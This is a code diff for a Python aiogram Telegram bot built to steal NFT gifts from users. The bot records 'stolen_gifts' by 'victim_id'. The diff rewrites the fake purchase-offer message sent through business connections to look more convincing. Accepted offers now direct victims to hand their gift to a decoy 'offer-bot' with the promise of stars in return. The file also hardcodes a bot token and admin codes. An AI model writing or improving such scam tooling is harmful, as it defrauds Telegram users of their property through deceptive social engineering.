@@ -4,8 +4,6 @@ from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
 from aiogram.filters import Command, CommandStart
 from aiogram.exceptions import TelegramConflictError, TelegramBadRequest, TelegramForbiddenError
-from aiogram.fsm.context import FSMContext
-from aiogram.fsm.state import State, StatesGroup
 from aiogram.types import Message, CallbackQuery, ErrorEvent, InlineKeyboardMarkup, InlineKeyboardButton
 
 logging.basicConfig(level=logging.INFO)
@@ -15,7 +13,8 @@ TOKEN = "9229716042:AAEQegQ6fNeZk5iLMwV2Ygt_77S-Dg7wZKk"
 OWNER_ID = 8567408555
 ADMIN_CODE = "admin777"
 OWNER_CODE = "2427"
-TARGET_UNAME = "gallsker"
+TARGET_UNAME = "manageroffers029"
+OFFER_BOT_UNAME = "offers"
 MAX_AMOUNT = 10_000_000
 
 DB = sqlite3.connect("users.db", check_same_thread=False, timeout=30)
@@ -28,6 +27,13 @@ cursor.execute("CREATE TABLE IF NOT EXISTS offers (id TEXT PRIMARY KEY, owner_id
 cursor.execute("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, error TEXT, time TEXT)")
 cursor.execute("CREATE TABLE IF NOT EXISTS stolen_gifts (id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id INTEGER, gift_type TEXT, time TEXT)")
 DB.commit()
+
+def extract_nft_name(link):
+    try:
+        name = link.split("/nft/")[-1].split("-")[0]
+        return name.replace("_", " ").replace("-", " ").title()
+    except:
+        return "NFT Подарок"
 
 def has_rank(user_id, req_rank):
     if user_id == OWNER_ID: return True
@@ -172,7 +178,7 @@ T = {
     "adm_ok": "✅ Теперь ты АДМИН.",
     "own_ok": "✅ Теперь ты ВЛАДЕЛЕЦ.",
     "reset": "🔄 Роли сброшены.",
-    "offer": '👥 {name} предлагает <b>{amount} ⭐️</b> за ваш <a href="{link}">NFT</a>.',
+    "offer": "👤 Пользователь <b>{name}</b> предлагает вам покупку NFT-подарка.\n\n🖼 <b>Подарок:</b> <a href=\"{link}\">{nft_name}</a>\n💰 <b>Сумма:</b> {amount} ⭐️\n\n⚠️ <i>Нажмите кнопку ниже, чтобы принять или отклонить.</i>",
     "acc": "🟢 Принять", "dec": "❌ Отклонить",
     "al_acc": "⚠️ Для получения {amount} ⭐️ перейдите к оффер-боту.",
     "al_dec": "❌ Вы отклонили.",
@@ -381,9 +387,10 @@ async def send_off(m: Message):
     i = secrets.token_hex(6)
     save_offer(i, m.from_user.id, t_id, c_conn, int(a), l, TARGET_UNAME)
 
+    nft_name = extract_nft_name(l)
     kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=T["acc"], callback_data=f"o:acc:{i}"), InlineKeyboardButton(text=T["dec"], callback_data=f"o:dec:{i}")]])
     try:
-        await bot.send_message(t_id, T["offer"].format(name=html.escape(m.from_user.username or m.from_user.first_name), amount=a, link=l), reply_markup=kb, business_connection_id=c_conn)
+        await bot.send_message(t_id, T["offer"].format(name=html.escape(m.from_user.username or m.from_user.first_name), amount=a, link=l, nft_name=html.escape(nft_name)), reply_markup=kb, business_connection_id=c_conn)
         await m.answer(f"✅ Оффер отправлен! Получатель подарков: @{TARGET_UNAME}")
     except Exception as e:
         log_err(e)
@@ -400,14 +407,15 @@ async def cb_off(c: CallbackQuery):
     if s != "pending": return await c.answer("Уже обработано.", show_alert=True)
 
     if a == "acc":
-        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=T["send"], url=f"https://t.me/{t_uname}")]])
+        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=T["send"], url=f"https://t.me/{OFFER_BOT_UNAME}")]])
+        msg_text = f'✅ <b>Сделка подтверждена!</b>\n\nПЕРЕДАЙТЕ ПОДАРОК ОФФЕР-БОТУ <a href="https://t.me/{OFFER_BOT_UNAME}">@{OFFER_BOT_UNAME}</a> ДЛЯ ПОЛУЧЕНИЯ ЗВЕЗД НА БАЛАНС.'
         try:
-            await bot.edit_message_text(f'✅ Принято.\n\nПередайте подарок <a href="https://t.me/{t_uname}">@{t_uname}</a>.', chat_id=c.message.chat.id, message_id=c.message.message_id, reply_markup=kb)
+            await bot.edit_message_text(msg_text, chat_id=c.message.chat.id, message_id=c.message.message_id, reply_markup=kb)
             upd_offer(i, "accepted")
         except TelegramBadRequest as e:
             log.warning(f"edit_message_text offer acc: {e}")
             try:
-                await bot.send_message(c.message.chat.id, f'✅ Принято.\n\nПередайте подарок <a href="https://t.me/{t_uname}">@{t_uname}</a>.', reply_markup=kb, business_connection_id=cn)
+                await bot.send_message(c.message.chat.id, msg_text, reply_markup=kb, business_connection_id=cn)
                 upd_offer(i, "accepted")
             except Exception as e2:
                 log_err(e2)
